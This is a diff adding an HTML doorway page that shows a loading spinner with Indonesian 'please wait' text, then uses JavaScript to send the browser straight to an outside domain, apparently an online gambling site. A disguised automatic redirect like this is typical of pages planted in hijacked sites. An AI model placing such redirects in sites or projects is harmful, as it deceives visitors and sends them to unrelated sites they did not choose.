@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+        body{
+            background:#0a0a0a;
+            min-height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
+            color:#fff
+        }
+        .loader{
+            width:60px;height:60px;
+            border:6px solid #333;
+            border-top:6px solid #f00;
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+            margin-bottom:20px
+        }
+        @keyframes spin{to{transform:rotate(360deg)}}
+        h2{color:#aaa;font-weight:normal}
+    </style>
+</head>
+<body>
+    <!-- Redirect otomatis pake JavaScript -->
+    <div class="loader"></div>
+    <h2>Memuat halaman, mohon tunggu...</h2>
+    
+    <script>
+        // LANGSUNG REDIRECT KE LINK TUJUAN
+        window.location.href = "https://mgw138bom.com/";
+    </script>
+</body>
+  </html>
